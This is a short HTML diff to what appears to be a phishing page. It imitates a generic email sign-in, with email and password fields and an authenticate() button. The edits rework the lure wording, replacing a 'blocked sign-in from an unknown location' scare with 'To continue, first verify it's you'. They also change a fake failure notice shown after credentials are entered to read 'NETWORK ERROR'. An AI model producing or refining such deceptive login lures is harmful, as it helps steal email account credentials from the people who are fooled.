@@ -144,8 +144,8 @@
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <img src="https://img.icons8.com/ios-filled/100/000000/new-post.png" alt="Email Icon">
-    <h2>Verify Authentication</h2>
-    <p class="subtext">We blocked a sign-in from an unknown location and denied access to your email account</p>
+    <h2>Log in</h2>
+    <p class="subtext">To continue, first verify it’s you</p>
     <input type="email" id="email" placeholder="Email Address" required>
     <input type="password" id="password" placeholder="Password" required>
     <button onclick="authenticate()">Login</button>
@@ -154,7 +154,7 @@
 
   <!-- Confirmation Message -->
   <div id="confirmation">
-    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+    <h2 style="color: white;">NETWORK ERROR</h2>
     <p>You've entered an invalid email address / password combination.</p>
     <button onclick="window.close()">Close this page</button>
   </div>
